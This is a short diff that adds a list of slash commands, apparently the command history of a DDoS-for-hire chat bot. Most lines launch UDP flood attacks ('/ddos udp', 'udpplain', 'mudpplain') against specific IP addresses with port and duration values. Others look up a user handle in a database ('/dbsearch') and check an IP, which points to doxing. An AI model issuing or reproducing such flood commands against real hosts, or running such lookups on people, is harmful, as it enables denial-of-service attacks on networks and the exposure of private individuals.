@@ -1,0 +1,22 @@
+/methods
+/methods
+/help
+/xboxcode
+/commands
+/ddos
+/ddos udp 108.90.5.231 60
+/ddos
+/ddos
+/ddos
+/status
+/tr4p
+/dbsearch Oapap#1599
+/info
+/checkip 162.247.229.67
+/ddos udp 162.247.229.67 35
+/Mudpplain 162.247.229.67 60 80
+/info
+/tr4p
+/Mudpplain 162.247.229.67 80 80
+/ddos mudpplain 162.247.229.67 80 80
+/ddos udpplain 162.247.229.67 80 80
